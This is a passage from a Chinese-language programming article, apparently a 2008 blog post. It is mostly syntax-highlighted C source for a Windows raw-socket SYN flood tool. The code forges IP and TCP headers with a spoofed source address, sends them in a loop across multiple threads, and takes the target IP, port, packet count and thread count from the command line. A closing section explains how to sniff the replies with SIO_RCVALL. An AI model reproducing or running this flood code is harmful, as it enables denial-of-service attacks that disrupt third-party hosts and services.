style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(tcpHeader), </span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">, </span><span style="COLOR: #000000">4</span><span style="COLOR: #000000">); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    ipHeader.checksum</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">checksum((USHORT </span><span style="COLOR: #000000">*</span><span style="COLOR: #000000">)szSendBuf, </span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(ipHeader)</span><span style="COLOR: #000000">+</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(tcpHeader)); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    memcpy(szSendBuf, </span><span style="COLOR: #000000">&amp;</span><span style="COLOR: #000000">ipHeader, </span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(ipHeader)); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">for</span><span style="COLOR: #000000">(DWORD i</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">;i</span><span style="COLOR: #000000">&lt;</span><span style="COLOR: #000000">s_sendount;i</span><span style="COLOR: #000000">++</span><span style="COLOR: #000000">)<br/><img align="top" alt="" id="_5436_5707_Open_Image" src="images/ez/37c8bf68cdc3cc81759c34160776bc53.gif"/><img align="top" alt="" id="_5436_5707_Closed_Image" src="images/ez/7ff8d92cded7e0ce15e7ca1acc870052.gif" style="DISPLAY: none"/>    </span><span id="_5436_5707_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span><span id="_5436_5707_Open_Text"><span style="COLOR: #000000">{<!-- --><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        rect</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">sendto(sock, szSendBuf, </span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(ipHeader)</span><span style="COLOR: #000000">+</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(tcpHeader), <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>            </span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">, (</span><span style="COLOR: #0000ff">struct</span><span style="COLOR: #000000"> sockaddr</span><span style="COLOR: #000000">*</span><span style="COLOR: #000000">)</span><span style="COLOR: #000000">&amp;</span><span style="COLOR: #000000">addr_in, </span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(addr_in)); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        </span><span style="COLOR: #0000ff">if</span><span style="COLOR: #000000"> (rect</span><span style="COLOR: #000000">==</span><span style="COLOR: #000000">SOCKET_ERROR) <br/><img align="top" alt="" id="_5588_5661_Open_Image" src="images/ez/37c8bf68cdc3cc81759c34160776bc53.gif"/><img align="top" alt="" id="_5588_5661_Closed_Image" src="images/ez/7ff8d92cded7e0ce15e7ca1acc870052.gif" style="DISPLAY: none"/>        </span><span id="_5588_5661_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span><span id="_5588_5661_Open_Text"><span style="COLOR: #000000">{ <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>            printf(</span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">send error!:%d </span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">,WSAGetLastError()); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>            </span><span style="COLOR: #0000ff">return</span><span style="COLOR: #000000"> FALSE; <br/><img align="top" alt="" src="images/ez/717446ca04a6125dc5b6b54e0fa14ab4.gif"/>        }</span></span><span style="COLOR: #000000"> <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        </span><span style="COLOR: #0000ff">else</span><span style="COLOR: #000000"> <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>            printf(</span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">send ok! %d </span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">,rect); <br/><img align="top" alt="" src="images/ez/717446ca04a6125dc5b6b54e0fa14ab4.gif"/>    }</span></span><span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    closesocket(sock); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">return</span><span style="COLOR: #000000"> </span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">;<br/><img align="top" alt="" src="images/ez/0196c3df5ea9e936f21e9932cca91014.gif"/>}</span></span>
<span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/> DWORD WINAPI WORKER_THREAD(<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/>    LPVOID lpThreadParameter<br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/>    )<br/><img align="top" alt="" id="_5812_5881_Open_Image" src="images/ez/a41954a27d6ad96fa2c2cf816e677448.gif"/><img align="top" alt="" id="_5812_5881_Closed_Image" src="images/ez/1327ab569c1ae82736693a50b8e33378.gif" style="DISPLAY: none"/> </span>
<span id="_5812_5881_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span>
<span id="_5812_5881_Open_Text"><span style="COLOR: #000000">{<!-- --><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>     </span><span style="COLOR: #0000ff">return</span><span style="COLOR: #000000"> syn_flood_attack(s_destip,s_destport,s_srcip,s_srcport);<br/><img align="top" alt="" src="images/ez/0196c3df5ea9e936f21e9932cca91014.gif"/> }</span></span>
<span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
<span style="COLOR: #0000ff">int</span>
<span style="COLOR: #000000"> _tmain(</span>
<span style="COLOR: #0000ff">int</span>
<span style="COLOR: #000000"> argc, _TCHAR</span>
<span style="COLOR: #000000">*</span>
<span style="COLOR: #000000"> argv[])<br/><img align="top" alt="" id="_5921_6551_Open_Image" src="images/ez/a41954a27d6ad96fa2c2cf816e677448.gif"/><img align="top" alt="" id="_5921_6551_Closed_Image" src="images/ez/1327ab569c1ae82736693a50b8e33378.gif" style="DISPLAY: none"/></span>
<span id="_5921_6551_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span>
<span id="_5921_6551_Open_Text"><span style="COLOR: #000000">{<!-- --><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    WSADATA WSAData; <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">if</span><span style="COLOR: #000000"> (argc</span><span style="COLOR: #000000">!=</span><span style="COLOR: #000000"> </span><span style="COLOR: #000000">7</span><span style="COLOR: #000000">) <br/><img align="top" alt="" id="_5970_6004_Open_Image" src="images/ez/37c8bf68cdc3cc81759c34160776bc53.gif"/><img align="top" alt="" id="_5970_6004_Closed_Image" src="images/ez/7ff8d92cded7e0ce15e7ca1acc870052.gif" style="DISPLAY: none"/>    </span><span id="_5970_6004_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span><span id="_5970_6004_Open_Text"><span style="COLOR: #000000">{ <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        useage(); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        </span><span style="COLOR: #0000ff">return</span><span style="COLOR: #000000"> </span><span style="COLOR: #0000ff">false</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/717446ca04a6125dc5b6b54e0fa14ab4.gif"/>    }</span></span><span style="COLOR: #000000"> <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">if</span><span style="COLOR: #000000"> (WSAStartup(MAKEWORD(</span><span style="COLOR: #000000">2</span><span style="COLOR: #000000">,</span><span style="COLOR: #000000">2</span><span style="COLOR: #000000">), </span><span style="COLOR: #000000">&amp;</span><span style="COLOR: #000000">WSAData)</span><span style="COLOR: #000000">!=</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">) <br/><img align="top" alt="" id="_6055_6110_Open_Image" src="images/ez/37c8bf68cdc3cc81759c34160776bc53.gif"/><img align="top" alt="" id="_6055_6110_Closed_Image" src="images/ez/7ff8d92cded7e0ce15e7ca1acc870052.gif" style="DISPLAY: none"/>    </span><span id="_6055_6110_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span><span id="_6055_6110_Open_Text"><span style="COLOR: #000000">{ <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        printf(</span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">WSAStartup Error! </span><span style="COLOR: #000000">"</span><span style="COLOR: #000000">); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        </span><span style="COLOR: #0000ff">return</span><span style="COLOR: #000000"> </span><span style="COLOR: #0000ff">false</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/717446ca04a6125dc5b6b54e0fa14ab4.gif"/>    }</span></span><span style="COLOR: #000000"> <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">int</span><span style="COLOR: #000000"> i </span><span style="COLOR: #000000">=</span><span style="COLOR: #000000"> atoi(argv[</span><span style="COLOR: #000000">5</span><span style="COLOR: #000000">]);<br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    memcpy(</span><span style="COLOR: #000000">&amp;</span><span style="COLOR: #000000">s_sendount,</span><span style="COLOR: #000000">&amp;</span><span style="COLOR: #000000">i,</span><span style="COLOR: #0000ff">sizeof</span><span style="COLOR: #000000">(i));<br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">int</span><span style="COLOR: #000000"> tn </span><span style="COLOR: #000000">=</span><span style="COLOR: #000000"> atoi(argv[</span><span style="COLOR: #000000">6</span><span style="COLOR: #000000">]);<br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    strncpy(s_destip,argv[</span><span style="COLOR: #000000">1</span><span style="COLOR: #000000">],</span><span style="COLOR: #000000">99</span><span style="COLOR: #000000">);<br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    s_destport </span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">  atoi(argv[</span><span style="COLOR: #000000">2</span><span style="COLOR: #000000">]);<br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    strncpy(s_srcip,argv[</span><span style="COLOR: #000000">3</span><span style="COLOR: #000000">],</span><span style="COLOR: #000000">99</span><span style="COLOR: #000000">);<br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    s_srcport </span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">  atoi(argv[</span><span style="COLOR: #000000">4</span><span style="COLOR: #000000">]);<br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    HANDLE </span><span style="COLOR: #000000">*</span><span style="COLOR: #000000">ths </span><span style="COLOR: #000000">=</span><span style="COLOR: #000000"> </span><span style="COLOR: #0000ff">new</span><span style="COLOR: #000000"> HANDLE[tn];<br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">for</span><span style="COLOR: #000000">(i</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">;i</span><span style="COLOR: #000000">&lt;</span><span style="COLOR: #000000">tn;i</span><span style="COLOR: #000000">++</span><span style="COLOR: #000000">)<br/><img align="top" alt="" id="_6373_6430_Open_Image" src="images/ez/37c8bf68cdc3cc81759c34160776bc53.gif"/><img align="top" alt="" id="_6373_6430_Closed_Image" src="images/ez/7ff8d92cded7e0ce15e7ca1acc870052.gif" style="DISPLAY: none"/>    </span><span id="_6373_6430_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span><span id="_6373_6430_Open_Text"><span style="COLOR: #000000">{<!-- --><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        ths[i]</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">CreateThread(</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">,</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">,WORKER_THREAD,NULL,</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">,NULL);<br/><img align="top" alt="" src="images/ez/717446ca04a6125dc5b6b54e0fa14ab4.gif"/>    }</span></span><span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">for</span><span style="COLOR: #000000">(i</span><span style="COLOR: #000000">=</span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">;i</span><span style="COLOR: #000000">&lt;</span><span style="COLOR: #000000">tn;i</span><span style="COLOR: #000000">++</span><span style="COLOR: #000000">)<br/><img align="top" alt="" id="_6453_6519_Open_Image" src="images/ez/37c8bf68cdc3cc81759c34160776bc53.gif"/><img align="top" alt="" id="_6453_6519_Closed_Image" src="images/ez/7ff8d92cded7e0ce15e7ca1acc870052.gif" style="DISPLAY: none"/>    </span><span id="_6453_6519_Closed_Text" style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff">...</span><span id="_6453_6519_Open_Text"><span style="COLOR: #000000">{<!-- --><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        WaitForSingleObject(ths[i],INFINITE);<br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>        CloseHandle(ths[i]);<br/><img align="top" alt="" src="images/ez/717446ca04a6125dc5b6b54e0fa14ab4.gif"/>    }</span></span><span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    WSACleanup(); <br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/><br/><img align="top" alt="" src="images/ez/6a9c071a08f1dae2d3e1c512000eef41.gif"/>    </span><span style="COLOR: #0000ff">return</span><span style="COLOR: #000000"> </span><span style="COLOR: #000000">0</span><span style="COLOR: #000000">; <br/><img align="top" alt="" src="images/ez/0196c3df5ea9e936f21e9932cca91014.gif"/>}</span></span>
<span style="COLOR: #000000"><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/><br/><img align="top" alt="" src="images/ez/6810355c2f78c12e91b7997a8e8c583a.gif"/></span>
</img></div>
</div>
<p> </p>
<p><br/>4、接收数据 <br/>和 发送原始套接字数据相比，接收就比较麻烦了。因为在WIN我们不能用recv()来接收raw socket上的数据，这是因为，所有的IP包都是先递交给系统核心，然后再传输到用户程序，当发送一个raws socket包的时候（比如syn），核心并不知道，也没有这个数据被发送或者连接建立的记录，因此，当远端主机回应的时候，系统核心就把这些包都全部丢 掉，从而到不了应用程序上。所以，就不能简单地使用接收函数来接收这些数据报。 <br/><br/>要达到接收数据的目的，就必须采用嗅探，接收所有通过的数据包，然后进行筛选，留下符合我们需要的。可以再定义一个原始套接字，用来完成接收数据的任务，需要设置SIO_RCVALL，表示接收所有的数据。 <br/><br/>SOCKET sniffersock; <br/>sniffsock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_IP, NULL, 0, WSA_FLAG_OVERLAPPED); <br/><br/>DWORD lpvBuffer = 1; <br/>DWORD lpcbBytesReturned = 0 ; <br/>WSAIoctl(sniffersock, SIO_RCVALL, &amp;lpvBuffer, sizeof(lpvBuffer), NULL, 0, &amp; lpcbBytesReturned, NULL, NULL); <br/><br/>创建一个用于接收数据的原始套接字，我们可以用接收函数来接收数据包了。然后在使用一个过滤函数达到筛选的目的，接收我们需要的数据包。</p>
<p> </p>
<p> </p>
</div>
    </div>
    
    <div class="footer">
        <p>版本所有 tdany.com  | 发表时间: 2008-05-21 22:40:00</p>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js"></script>

    <script>
        // 处理代码块，添加语言类和复制功能
        document.addEventListener('DOMContentLoaded', function() {            
            // 为没有指定语言的代码块添加默认语言
            document.querySelectorAll('pre code:not([class*="language-"])').forEach(function(block) {
                block.className = 'hljs language-javascript';
            });
            
            // 确保所有代码块都有hljs类
            document.querySelectorAll('pre code[class*="language-"]:not([class*="hljs"])').forEach(function(block) {
                block.className = 'hljs ' + block.className;
            });
            
            // 为所有代码块添加自定义复制按钮
            document.querySelectorAll('pre').forEach(function(pre) {
                // 创建复制按钮
                var copyButton = document.createElement('button');
                copyButton.className = 'copy-button';
                copyButton.textContent = '复制';
                copyButton.style.position = 'absolute';
                copyButton.style.top = '5px';
                copyButton.style.right = '5px';
                copyButton.style.background = 'rgba(0,0,0,0.3)';
                copyButton.style.color = 'white';
                copyButton.style.border = 'none';
                copyButton.style.borderRadius = '3px';
                copyButton.style.padding = '5px 10px';
                copyButton.style.fontSize = '0.8em';
                copyButton.style.cursor = 'pointer';
                copyButton.style.display = 'none';
                
                // 鼠标悬停时显示按钮
                pre.addEventListener('mouseenter', function() {
                    copyButton.style.display = 'block';
                });
                
                pre.addEventListener('mouseleave', function() {
                    copyButton.style.display = 'none';
                });
                
                // 点击复制按钮时复制代码
                copyButton.addEventListener('click', function() {
                    var code = pre.querySelector('code');
                    var text = code.textContent || code.innerText;
                    
                    // 使用现代的 Clipboard API
                    if (navigator.clipboard && navigator.clipboard.writeText) {
                        navigator.clipboard.writeText(text)
                            .then(function() {
                                copyButton.textContent = '已复制!';
                                setTimeout(function() {
                                    copyButton.textContent = '复制';
                                }, 2000);
                            })
                            .catch(function(err) {
                                console.error('Clipboard API 复制失败:', err);
                                // 如果 Clipboard API 失败，尝试使用传统方法
                                fallbackCopyToClipboard();
                            });
                    } else {
                        // 对于不支持 Clipboard API 的浏览器，使用传统方法
                        fallbackCopyToClipboard();
                    }
                    
                    // 传统复制方法作为后备
                    function fallbackCopyToClipboard() {
                        // 创建临时文本区域
                        var textArea = document.createElement('textarea');
                        textArea.value = text;
                        textArea.style.position = 'fixed';
                        textArea.style.left = '-9999px';
                        textArea.style.top = '0';
                        document.body.appendChild(textArea);
                        textArea.focus();
                        textArea.select();
                        
                        try {
                            var successful = document.execCommand('copy');
                            if (successful) {
                                copyButton.textContent = '已复制!';
                                setTimeout(function() {
                                    copyButton.textContent = '复制';
                                }, 2000);
                            } else {
                                copyButton.textContent = '复制失败';
                            }
                        } catch (err) {
                            copyButton.textContent = '复制失败';
                            console.error('传统复制方法失败:', err);
                        }
                        
                        document.body.removeChild(textArea);
                    }
                });
                
                // 添加按钮到代码块
                pre.style.position = 'relative';
                pre.appendChild(copyButton);
            });
            
            // 确保Prism重新高亮所有代码块
            if (typeof Prism !== 'undefined') {
                Prism.highlightAll();
            }
        });
    </script>
</body>
</html>
